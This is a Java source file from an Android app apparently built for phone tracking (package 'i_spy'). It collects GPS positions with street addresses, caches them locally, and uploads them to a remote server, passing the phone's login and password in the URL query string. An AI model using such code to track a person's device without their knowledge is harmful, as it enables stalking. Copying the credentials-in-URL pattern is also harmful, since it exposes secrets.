package com.um.asn.i_spy.manager;

import android.content.Context;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

import com.um.asn.i_spy.Config;
import com.um.asn.i_spy.database_helper.DatabaseHelper;
import com.um.asn.i_spy.http_methods.HttpPostTask;
import com.um.asn.i_spy.listeners.GPSListener;
import com.um.asn.i_spy.models.Phone;
import com.um.asn.i_spy.models.PositionGPS;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.concurrent.ExecutionException;

public class PositionGPSManager {

    public Context context;
    public ConnectivityManager cm;
    public Phone phone;
    public Location location;
    public HashMap<String, String> address;
    public ArrayList<PositionGPS> positions;

    public PositionGPSManager(Context context, Phone phone) {
        this.context = context;
        this.phone = phone;
        this.cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        this.positions = new ArrayList<PositionGPS>();
    }

    public void run() {
        if (setLocation())
            saveLocation();
    }

    public boolean setLocation() {
        this.location = new GPSListener(this.context).getLocation();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        if (this.location != null) {
            this.positions.add(new PositionGPS(this.location, sdf.format(new Date()), this.phone));
            return true;
        }
        return false;
    }

    public void saveLocation() {
        if (!insert())
            insertLocal();
    }

    public boolean insert() {
        NetworkInfo networkInfo = this.cm.getActiveNetworkInfo();
        if (networkInfo != null && networkInfo.isConnected()) {
            JSONArray jaP = new JSONArray();

            for (PositionGPS pos : this.positions) {
                pos.setAdresseFields(this.context);

                JSONObject jo = new JSONObject();
                try {
                    jo.put("id", pos.getId());
                    jo.put("latitude", pos.getLatitude());
                    jo.put("longitude", pos.getLongitude());
                    jo.put("pays", pos.getPays());
                    jo.put("ville", pos.getVille());
                    jo.put("codePostal", pos.getCodePostal());
                    jo.put("adresse", pos.getAdresse());
                    jo.put("datePosition", pos.getDatePosition());
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                jaP.put(jo);
            }

            try {
                String url = Config.SERVER_DOMAIN + "positionsGPS";
                url += "?phone[login]=" + phone.getLogin() + "&phone[password]=" + phone.getPassword();
                JSONObject result = new JSONObject((String) new HttpPostTask().execute(new Object[]{url, jaP.toString()}).get());

                if ((boolean) result.get("success")) {
                    System.out.println("Position saved dist");
                    return true;
                }
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (ExecutionException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        return false;
    }

    public void insertLocal() {
        DatabaseHelper myBD = new DatabaseHelper(this.context);
        myBD.insertPositionGPS(this.positions.get(0));
        System.out.println("Position saved local (" + myBD.getAllPositionGPS().size() + ")");
    }

    public void insertDistFromLocal() {
        DatabaseHelper myBD = new DatabaseHelper(this.context);
        this.positions = myBD.getAllPositionGPS();
        System.out.println("getAll size : " + this.positions.size());

        if (insert())
            myBD.deleteAllPositionGPS();
    }

}